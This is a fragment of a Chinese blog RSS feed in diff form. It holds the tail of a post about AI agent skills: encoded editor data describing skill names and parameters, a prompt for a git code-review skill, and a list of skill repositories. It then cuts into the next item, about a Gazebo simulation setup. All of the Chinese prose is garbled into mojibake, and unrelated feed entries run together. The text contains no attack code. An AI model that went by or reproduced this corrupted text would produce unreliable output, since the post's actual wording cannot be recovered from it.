OCU4MyVCRCVFNSU5MCU4RCVFNyVBNyVCMCUyMiUyQyUyMmJvbGQlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFRiVCQyU5QSVFNCVCOCU4MCVFNCVCOCVBQSVFNyVBRSU4MCVFNyU5RiVBRCVFNyU5QSU4NCVFOCU4QiVCMSVFNiU5NiU4NyVFNiVBMCU4NyVFOCVBRiU4NiVFRiVCQyU4QyVFNiVBRiU5NCVFNSVBNiU4MiUyMiU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjJnZXRfd2VhdGhlciUyMiUyQyUyMmNvZGUlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIyYzQ4eHVyZnU3aSUyMiUyQyUyMnBhcmVudElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMmdyb3VwSWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIydHlwZSUyMiUzQSUyMmZsYXQtbGlzdC1pdGVtJTIyJTJDJTIybGlzdFR5cGUlMjIlM0ElMjJ1bm9yZGVyZWQlMjIlMkMlMjJpbmRleCUyMiUzQTElMkMlMjJsZXZlbCUyMiUzQTAlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjIlRTYlOEElODAlRTglODMlQkQlRTYlOEYlOEYlRTglQkYlQjAlMjIlMkMlMjJib2xkJTIyJTNBdHJ1ZSU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjIlRUYlQkMlOUElRTglQkYlOTklRTYlOTglQUYlRTYlOUMlODAlRTklODclOEQlRTglQTYlODElRTclOUElODQlRTQlQjglODAlRTclOEUlQUYlRUYlQkMlODElRTQlQkQlQTAlRTklOUMlODAlRTglQTYlODElRTclOTQlQTglRTglODclQUElRTclODQlQjYlRTglQUYlQUQlRTglQTglODAlRTUlOTElOEElRTglQUYlODlBZ2VudCVFOCVCRiU5OSVFNCVCOCVBQSVFNiU4QSU4MCVFOCU4MyVCRCVFNiU5OCVBRiVFNSVCOSVCMiVFNCVCQiU4MCVFNCVCOSU4OCVFNyU5QSU4NCVFRiVCQyU4QyVFNCVCQiVBNSVFNSU4RiU4QSVFNCVCQiU4MCVFNCVCOSU4OCVFNiU5NyVCNiVFNSU4MCU5OSVFOCVBRiVBNSVFNyU5NCVBOCVFNSVBRSU4MyVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIydjV4cGl2dnBmNmklMjIlMkMlMjJwYXJlbnRJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJncm91cElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMnR5cGUlMjIlM0ElMjJmbGF0LWxpc3QtaXRlbSUyMiUyQyUyMmxpc3RUeXBlJTIyJTNBJTIydW5vcmRlcmVkJTIyJTJDJTIyaW5kZXglMjIlM0ExJTJDJTIybGV2ZWwlMjIlM0EwJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU1JThGJTgyJUU2JTk1JUIwJUU1JUFFJTlBJUU0JUI5JTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlMkMlN0IlMjJ0ZXh0JTIyJTNBJTIyJUVGJUJDJTlBJUU2JTg5JUE3JUU4JUExJThDJUU4JUJGJTk5JUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTkzJUFBJUU0JUJBJTlCJUU4JUJFJTkzJUU1JTg1JUE1JUU0JUJGJUExJUU2JTgxJUFGJUVGJUJDJTlGJUU2JUFGJTk0JUU1JUE2JTgyJUU2JTlGJUE1JUU4JUFGJUEyJUU1JUE0JUE5JUU2JUIwJTk0JUU5JTlDJTgwJUU4JUE2JTgxJUUyJTgwJTlDJUU1JTlGJThFJUU1JUI4JTgyJUU1JTkwJThEJUUyJTgwJTlEJUU1JTkyJThDJUUyJTgwJTlDJUU2JTk3JUE1JUU2JTlDJTlGJUUyJTgwJTlEJUUzJTgwJTgyJTIyJTdEJTVEJTdEJTVE"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-node="text">1ãéæ±</span></span></span></div>
-<div class="_flat-list-item_b7kvz_1" data-slate-node="element" data-type="flat-list-item" data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNSVCRCU5MyVFNCVCRCVBMCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUUyJTgwJTlDJUU1JUI4JUFFJUU2JTg4JTkxJUU2JTlGJUE1JUU0JUI4JTgwJUU0JUI4JThCJUU1JThDJTk3JUU0JUJBJUFDJUU2JTk4JThFJUU1JUE0JUE5JUU3JTlBJTg0JUU1JUE0JUE5JUU2JUIwJTk0JUUyJTgwJTlEJUU2JTk3JUI2JUVGJUJDJThDQWdlbnQlRTclOUElODQlRTUlQTQlQTclRTglODQlOTElRTQlQkMlOUElRTUlODglODYlRTYlOUUlOTAlRTglQkYlOTklRTUlOEYlQTUlRTglQUYlOUQlRUYlQkMlOEMlRTclODQlQjYlRTUlOTAlOEUlRTUlODYlQjMlRTUlQUUlOUElRTglQjAlODMlRTclOTQlQTglRTQlQjglODAlRTQlQjglQUElRTIlODAlOUMlRTYlOUYlQTUlRTglQUYlQTIlRTUlQTQlQTklRTYlQjAlOTQlRTIlODAlOUQlRTclOUElODQlRTYlOEElODAlRTglODMlQkQlRTMlODAlODIlRTglQkYlOTklRTQlQjglQUElRTYlOEElODAlRTglODMlQkQlRTYlOUMlQUMlRTglQjQlQTglRTQlQjglOEElRTklODAlOUElRTUlQjglQjglRTYlOTglQUYlRTQlQjglODAlRTQlQjglQUFBUEklRTYlOEUlQTUlRTUlOEYlQTMlRTYlODglOTYlRTQlQjglODAlRTYlQUUlQjUlRTUlODclQkQlRTYlOTUlQjAlRTQlQkIlQTMlRTclQTAlODElRTMlODAlODIlMjIlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjViNTdjZjU2LTQ3ZWYtNGFkOS04MjgxLTg3OWJkYTdiZWEzZCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjJTa2lsbCUyMCUzRCUyMCVFNiU4RiU4RiVFOCVCRiVCMCVFRiVCQyU4OCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUU4JUJGJTk5JUU2JTk4JUFGJUU0JUJCJTgwJUU0JUI5JTg4JUVGJUJDJTg5JTJCJTIwJUU0JUJCJUEzJUU3JUEwJTgxJUVGJUJDJTg4JUU3JTlDJTlGJUU2JUFEJUEzJUU2JTg5JUE3JUU4JUExJThDJUU3JTlBJTg0JUU1JThBJUE4JUU0JUJEJTlDJUVGJUJDJTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjg5ZWE4Mjg0LTc1ZjQtNDkwNC1hZGE3LWI1ZjdkNjk4MjUzMCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJoZWFkZXIlMjIlMkMlMjJsZXZlbCUyMiUzQSUyMmg0JTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JUEwJUI4JUU1JUJGJTgzJUU0JUI4JTg5JUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJUU1JUE2JTgyJUU0JUJEJTk1JUU1JUFFJTlBJUU0JUI5JTg5JUU0JUI4JTgwJUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUVGJUJDJTlGJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI0YjMzY2UxYS1jZGNmLTRjOGMtODEzMy0wYTYzNmFhMWI4YzUlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIycGFyYWdyYXBoJTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JTk3JUEwJUU4JUFFJUJBJUU0JUJEJUJGJUU3JTk0JUE4JUU1JTkzJUFBJUU3JUE3JThEJUU1JUJDJTgwJUU1JThGJTkxJUU2JUExJTg2JUU2JTlFJUI2JUVGJUJDJTg4JUU1JUE2JTgyTGFuZ0NoYWluJTJDJTIwQXV0b0dlbiVFNyVBRCU4OSVFRiVCQyU4OSVFRiVCQyU4QyVFNSVBRSU5QSVFNCVCOSU4OSVFNCVCOCU4MCVFNCVCOCVBQVNraWxsJUU5JTgwJTlBJUU1JUI4JUI4JUU1JThGJUFBJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTg1JUIzJUU2JUIzJUE4JUU0JUI4JTg5JUU0JUI4JUFBJUU2JUEwJUI4JUU1JUJGJTgzJUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI1NmEzNTQ5OC1kMzgyLTQ0NzQtODVmMS02Mzg0NDc4YWQ3NWIlMjIlN0QlMkMlN0IlMjJpZCUyMiUzQSUyMjViZ3llN3AzcWxrJTIyJTJDJTIycGFyZW50SWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIyZ3JvdXBJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJ0eXBlJTIyJTNBJTIyZmxhdC1saXN0LWl0ZW0lMjIlMkMlMjJsaXN0VHlwZSUyMiUzQSUyMnVub3JkZXJlZCUyMiUyQyUyMmluZGV4JTIyJTNBMSUyQyUyMmxldmVsJTIyJTNBMCUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNiU4QSU4MCVFOCU4MyVCRCVFNSU5MCU4RCVFNyVBNyVCMCUyMiUyQyUyMmJvbGQlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFRiVCQyU5QSVFNCVCOCU4MCVFNCVCOCVBQSVFNyVBRSU4MCVFNyU5RiVBRCVFNyU5QSU4NCVFOCU4QiVCMSVFNiU5NiU4NyVFNiVBMCU4NyVFOCVBRiU4NiVFRiVCQyU4QyVFNiVBRiU5NCVFNSVBNiU4MiUyMiU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjJnZXRfd2VhdGhlciUyMiUyQyUyMmNvZGUlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIyYzQ4eHVyZnU3aSUyMiUyQyUyMnBhcmVudElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMmdyb3VwSWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIydHlwZSUyMiUzQSUyMmZsYXQtbGlzdC1pdGVtJTIyJTJDJTIybGlzdFR5cGUlMjIlM0ElMjJ1bm9yZGVyZWQlMjIlMkMlMjJpbmRleCUyMiUzQTElMkMlMjJsZXZlbCUyMiUzQTAlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjIlRTYlOEElODAlRTglODMlQkQlRTYlOEYlOEYlRTglQkYlQjAlMjIlMkMlMjJib2xkJTIyJTNBdHJ1ZSU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjIlRUYlQkMlOUElRTglQkYlOTklRTYlOTglQUYlRTYlOUMlODAlRTklODclOEQlRTglQTYlODElRTclOUElODQlRTQlQjglODAlRTclOEUlQUYlRUYlQkMlODElRTQlQkQlQTAlRTklOUMlODAlRTglQTYlODElRTclOTQlQTglRTglODclQUElRTclODQlQjYlRTglQUYlQUQlRTglQTglODAlRTUlOTElOEElRTglQUYlODlBZ2VudCVFOCVCRiU5OSVFNCVCOCVBQSVFNiU4QSU4MCVFOCU4MyVCRCVFNiU5OCVBRiVFNSVCOSVCMiVFNCVCQiU4MCVFNCVCOSU4OCVFNyU5QSU4NCVFRiVCQyU4QyVFNCVCQiVBNSVFNSU4RiU4QSVFNCVCQiU4MCVFNCVCOSU4OCVFNiU5NyVCNiVFNSU4MCU5OSVFOCVBRiVBNSVFNyU5NCVBOCVFNSVBRSU4MyVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIydjV4cGl2dnBmNmklMjIlMkMlMjJwYXJlbnRJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJncm91cElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMnR5cGUlMjIlM0ElMjJmbGF0LWxpc3QtaXRlbSUyMiUyQyUyMmxpc3RUeXBlJTIyJTNBJTIydW5vcmRlcmVkJTIyJTJDJTIyaW5kZXglMjIlM0ExJTJDJTIybGV2ZWwlMjIlM0EwJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU1JThGJTgyJUU2JTk1JUIwJUU1JUFFJTlBJUU0JUI5JTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlMkMlN0IlMjJ0ZXh0JTIyJTNBJTIyJUVGJUJDJTlBJUU2JTg5JUE3JUU4JUExJThDJUU4JUJGJTk5JUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTkzJUFBJUU0JUJBJTlCJUU4JUJFJTkzJUU1JTg1JUE1JUU0JUJGJUExJUU2JTgxJUFGJUVGJUJDJTlGJUU2JUFGJTk0JUU1JUE2JTgyJUU2JTlGJUE1JUU4JUFGJUEyJUU1JUE0JUE5JUU2JUIwJTk0JUU5JTlDJTgwJUU4JUE2JTgxJUUyJTgwJTlDJUU1JTlGJThFJUU1JUI4JTgyJUU1JTkwJThEJUUyJTgwJTlEJUU1JTkyJThDJUUyJTgwJTlDJUU2JTk3JUE1JUU2JTlDJTlGJUUyJTgwJTlEJUUzJTgwJTgyJTIyJTdEJTVEJTdEJTVE">
-<div class="cnblogs_code">
-<pre>å¸®æç¼åä¸ä¸ªagent skillsæè¦æ±æ¯gitä»£ç æäº¤å®¡ï¼æä»£ç å®¡éåè½ï¼åç°éèç¼ºé·ç­ç­</pre>
-</div>
-<p>2ãå¤å¶å½åé¡µç¨äºLLM</p>
-<p><a href="https://agentskills.io/specification" target="_blank" rel="noopener nofollow">ç¹æç´è¾¾</a></p>
-</div>
-<div class="_flat-list-item_b7kvz_1" data-slate-node="element" data-type="flat-list-item" data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNSVCRCU5MyVFNCVCRCVBMCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUUyJTgwJTlDJUU1JUI4JUFFJUU2JTg4JTkxJUU2JTlGJUE1JUU0JUI4JTgwJUU0JUI4JThCJUU1JThDJTk3JUU0JUJBJUFDJUU2JTk4JThFJUU1JUE0JUE5JUU3JTlBJTg0JUU1JUE0JUE5JUU2JUIwJTk0JUUyJTgwJTlEJUU2JTk3JUI2JUVGJUJDJThDQWdlbnQlRTclOUElODQlRTUlQTQlQTclRTglODQlOTElRTQlQkMlOUElRTUlODglODYlRTYlOUUlOTAlRTglQkYlOTklRTUlOEYlQTUlRTglQUYlOUQlRUYlQkMlOEMlRTclODQlQjYlRTUlOTAlOEUlRTUlODYlQjMlRTUlQUUlOUElRTglQjAlODMlRTclOTQlQTglRTQlQjglODAlRTQlQjglQUElRTIlODAlOUMlRTYlOUYlQTUlRTglQUYlQTIlRTUlQTQlQTklRTYlQjAlOTQlRTIlODAlOUQlRTclOUElODQlRTYlOEElODAlRTglODMlQkQlRTMlODAlODIlRTglQkYlOTklRTQlQjglQUElRTYlOEElODAlRTglODMlQkQlRTYlOUMlQUMlRTglQjQlQTglRTQlQjglOEElRTklODAlOUElRTUlQjglQjglRTYlOTglQUYlRTQlQjglODAlRTQlQjglQUFBUEklRTYlOEUlQTUlRTUlOEYlQTMlRTYlODglOTYlRTQlQjglODAlRTYlQUUlQjUlRTUlODclQkQlRTYlOTUlQjAlRTQlQkIlQTMlRTclQTAlODElRTMlODAlODIlMjIlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjViNTdjZjU2LTQ3ZWYtNGFkOS04MjgxLTg3OWJkYTdiZWEzZCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjJTa2lsbCUyMCUzRCUyMCVFNiU4RiU4RiVFOCVCRiVCMCVFRiVCQyU4OCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUU4JUJGJTk5JUU2JTk4JUFGJUU0JUJCJTgwJUU0JUI5JTg4JUVGJUJDJTg5JTJCJTIwJUU0JUJCJUEzJUU3JUEwJTgxJUVGJUJDJTg4JUU3JTlDJTlGJUU2JUFEJUEzJUU2JTg5JUE3JUU4JUExJThDJUU3JTlBJTg0JUU1JThBJUE4JUU0JUJEJTlDJUVGJUJDJTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjg5ZWE4Mjg0LTc1ZjQtNDkwNC1hZGE3LWI1ZjdkNjk4MjUzMCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJoZWFkZXIlMjIlMkMlMjJsZXZlbCUyMiUzQSUyMmg0JTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JUEwJUI4JUU1JUJGJTgzJUU0JUI4JTg5JUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJUU1JUE2JTgyJUU0JUJEJTk1JUU1JUFFJTlBJUU0JUI5JTg5JUU0JUI4JTgwJUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUVGJUJDJTlGJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI0YjMzY2UxYS1jZGNmLTRjOGMtODEzMy0wYTYzNmFhMWI4YzUlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIycGFyYWdyYXBoJTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JTk3JUEwJUU4JUFFJUJBJUU0JUJEJUJGJUU3JTk0JUE4JUU1JTkzJUFBJUU3JUE3JThEJUU1JUJDJTgwJUU1JThGJTkxJUU2JUExJTg2JUU2JTlFJUI2JUVGJUJDJTg4JUU1JUE2JTgyTGFuZ0NoYWluJTJDJTIwQXV0b0dlbiVFNyVBRCU4OSVFRiVCQyU4OSVFRiVCQyU4QyVFNSVBRSU5QSVFNCVCOSU4OSVFNCVCOCU4MCVFNCVCOCVBQVNraWxsJUU5JTgwJTlBJUU1JUI4JUI4JUU1JThGJUFBJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTg1JUIzJUU2JUIzJUE4JUU0JUI4JTg5JUU0JUI4JUFBJUU2JUEwJUI4JUU1JUJGJTgzJUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI1NmEzNTQ5OC1kMzgyLTQ0NzQtODVmMS02Mzg0NDc4YWQ3NWIlMjIlN0QlMkMlN0IlMjJpZCUyMiUzQSUyMjViZ3llN3AzcWxrJTIyJTJDJTIycGFyZW50SWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIyZ3JvdXBJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJ0eXBlJTIyJTNBJTIyZmxhdC1saXN0LWl0ZW0lMjIlMkMlMjJsaXN0VHlwZSUyMiUzQSUyMnVub3JkZXJlZCUyMiUyQyUyMmluZGV4JTIyJTNBMSUyQyUyMmxldmVsJTIyJTNBMCUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNiU4QSU4MCVFOCU4MyVCRCVFNSU5MCU4RCVFNyVBNyVCMCUyMiUyQyUyMmJvbGQlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFRiVCQyU5QSVFNCVCOCU4MCVFNCVCOCVBQSVFNyVBRSU4MCVFNyU5RiVBRCVFNyU5QSU4NCVFOCU4QiVCMSVFNiU5NiU4NyVFNiVBMCU4NyVFOCVBRiU4NiVFRiVCQyU4QyVFNiVBRiU5NCVFNSVBNiU4MiUyMiU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjJnZXRfd2VhdGhlciUyMiUyQyUyMmNvZGUlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIyYzQ4eHVyZnU3aSUyMiUyQyUyMnBhcmVudElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMmdyb3VwSWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIydHlwZSUyMiUzQSUyMmZsYXQtbGlzdC1pdGVtJTIyJTJDJTIybGlzdFR5cGUlMjIlM0ElMjJ1bm9yZGVyZWQlMjIlMkMlMjJpbmRleCUyMiUzQTElMkMlMjJsZXZlbCUyMiUzQTAlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjIlRTYlOEElODAlRTglODMlQkQlRTYlOEYlOEYlRTglQkYlQjAlMjIlMkMlMjJib2xkJTIyJTNBdHJ1ZSU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjIlRUYlQkMlOUElRTglQkYlOTklRTYlOTglQUYlRTYlOUMlODAlRTklODclOEQlRTglQTYlODElRTclOUElODQlRTQlQjglODAlRTclOEUlQUYlRUYlQkMlODElRTQlQkQlQTAlRTklOUMlODAlRTglQTYlODElRTclOTQlQTglRTglODclQUElRTclODQlQjYlRTglQUYlQUQlRTglQTglODAlRTUlOTElOEElRTglQUYlODlBZ2VudCVFOCVCRiU5OSVFNCVCOCVBQSVFNiU4QSU4MCVFOCU4MyVCRCVFNiU5OCVBRiVFNSVCOSVCMiVFNCVCQiU4MCVFNCVCOSU4OCVFNyU5QSU4NCVFRiVCQyU4QyVFNCVCQiVBNSVFNSU4RiU4QSVFNCVCQiU4MCVFNCVCOSU4OCVFNiU5NyVCNiVFNSU4MCU5OSVFOCVBRiVBNSVFNyU5NCVBOCVFNSVBRSU4MyVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIydjV4cGl2dnBmNmklMjIlMkMlMjJwYXJlbnRJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJncm91cElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMnR5cGUlMjIlM0ElMjJmbGF0LWxpc3QtaXRlbSUyMiUyQyUyMmxpc3RUeXBlJTIyJTNBJTIydW5vcmRlcmVkJTIyJTJDJTIyaW5kZXglMjIlM0ExJTJDJTIybGV2ZWwlMjIlM0EwJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU1JThGJTgyJUU2JTk1JUIwJUU1JUFFJTlBJUU0JUI5JTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlMkMlN0IlMjJ0ZXh0JTIyJTNBJTIyJUVGJUJDJTlBJUU2JTg5JUE3JUU4JUExJThDJUU4JUJGJTk5JUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTkzJUFBJUU0JUJBJTlCJUU4JUJFJTkzJUU1JTg1JUE1JUU0JUJGJUExJUU2JTgxJUFGJUVGJUJDJTlGJUU2JUFGJTk0JUU1JUE2JTgyJUU2JTlGJUE1JUU4JUFGJUEyJUU1JUE0JUE5JUU2JUIwJTk0JUU5JTlDJTgwJUU4JUE2JTgxJUUyJTgwJTlDJUU1JTlGJThFJUU1JUI4JTgyJUU1JTkwJThEJUUyJTgwJTlEJUU1JTkyJThDJUUyJTgwJTlDJUU2JTk3JUE1JUU2JTlDJTlGJUUyJTgwJTlEJUUzJTgwJTgyJTIyJTdEJTVEJTdEJTVE"><span data-slate-node="text"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-node="text"><img src="https://img2024.cnblogs.com/blog/1504448/202604/1504448-20260405213706696-923453923.gif" alt="generateCode" loading="lazy"></span></span></span></span>
-<h2>ææ</h2>
-<h3>kimi</h3>
-<p>ããæè§kimiçAgentæ¨¡åè¿ä¸éï¼å¯ä»¥æåå¥½çskillä¸è½½åºæ¥</p>
-<p><img src="https://img2024.cnblogs.com/blog/1504448/202604/1504448-20260405214351416-1564479095.png" alt="image" loading="lazy"></p>
-<h3>ChatGPT</h3>
-<p><img src="https://img2024.cnblogs.com/blog/1504448/202604/1504448-20260405214715893-391087556.gif" alt="generateCode" loading="lazy"></p>
-<h1 style="text-align: center">skillç®å½ç»æä»ç»</h1>
-<p><img src="https://img2024.cnblogs.com/blog/1504448/202604/1504448-20260405225823190-717904932.png" alt="image" loading="lazy"></p>
-<p><img src="https://img2024.cnblogs.com/blog/1504448/202604/1504448-20260405230828084-138467404.png" alt="image" loading="lazy"></p>
-<h1 style="text-align: center">skillç«ç¹</h1>
-<ol>
-<li>anthropicå®æ¹ä»åºï¼<a href="https://github.com/anthropics/skills" target="_blank" rel="noopener nofollow">https://github.com/anthropics/skills</a></li>
-<li>Skillsç¤¾ç¾¤ç½ç«ï¼<a href="http://skillsmp.com/zh" target="_blank" rel="noopener nofollow">http://skillsmp.com/zh</a></li>
-<li>ä¼åå¼æºéåï¼<a href="https://github.com/ComposioHQ/awesome-claude-skills" target="_blank" rel="noopener nofollow">https://github.com/ComposioHQ/awesome-claude-skills</a></li>
-<li>è§é¢å¶ä½skillï¼<a href="https://github.com/remotion-dev/skills" target="_blank" rel="noopener nofollow">https://github.com/remotion-dev/skills</a></li>
-<li>youtubeè§é¢åªè¾skillï¼<a href="https://github.com/op7418/Youtube-clipper-skill" target="_blank" rel="noopener nofollow">https://github.com/op7418/Youtube-clipper-skill</a></li>
-<li>å¤§å¸å¸®ä½ åå»ºskillçskillï¼<a href="https://github.com/GBSOSS/skill-from-masters" target="_blank" rel="noopener nofollow">https://github.com/GBSOSS/skill-from-masters</a></li>
-<li>notebookLM skillï¼<a href="https://github.com/PleasePrompto/notebooklm-skill" target="_blank" rel="noopener nofollow">https://github.com/PleasePrompto/notebooklm-skill</a></li>
-<li>markdownåå¸å°X skillï¼<a href="https://github.com/wshuyi/x-article-publisher-skill" target="_blank" rel="noopener nofollow">https://github.com/wshuyi/x-article-publisher-skill</a></li>
-<li>AIè§é¢äº§åvidu skillsï¼<a href="https://www.vidu.cn/" target="_blank" rel="noopener nofollow">https://www.vidu.cn/</a></li>
-</ol>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-</div>
-
-</div>
-<div id="MySignature" role="contentinfo">
-    <div><b>ä½èï¼<a href="https://www.cnblogs.com/chenyanbin/">éå½¦æ</a></b></div>
-<div><b>åºå¤ï¼<a href="https://www.cnblogs.com/chenyanbin/">https://www.cnblogs.com/chenyanbin/
-</a></b></div>
-<div>
-<b>å³æ³¨ï¼</b>
-<a href="javascript:void(0)" onclick="follow('19ba9acf-d8e6-4343-a5ad-08d62b9df80b')"><strong><span style="color: #ff0000">ç¹æå(ï¼¾ï¼µï¼¾)ã~ï¼¹ï¼¯</span></strong></a>
-</div>
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0.05625" data-date-updated="2026-04-05 23:10">2026-04-05 21:49</span>&nbsp;
-<a href="https://www.cnblogs.com/chenyanbin">éå½¦æ</a>&nbsp;
-éè¯»(<span id="post_view_count">111</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(19824343);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fchenyanbin%2Fp%2F19824343%2Fagentskills&amp;targetId=19824343&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
-</div>
-         ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ é¾è¯2k0300 - èµ°é©¬è§ç¢ç»Gazeboä»¿çç¯å¢æ­å»º ]]></title>
-    <link>https://www.cnblogs.com/zyly/p/19823982</link>
-    <guid>00dff03f14a37afba0a6e8122abf61b2</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/zyly/p/19823982" title="åå¸äº 2026-04-05 17:58">
-    <span role="heading" aria-level="2">é¾è¯2k0300 - èµ°é©¬è§ç¢ç»Gazeboä»¿çç¯å¢æ­å»º</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
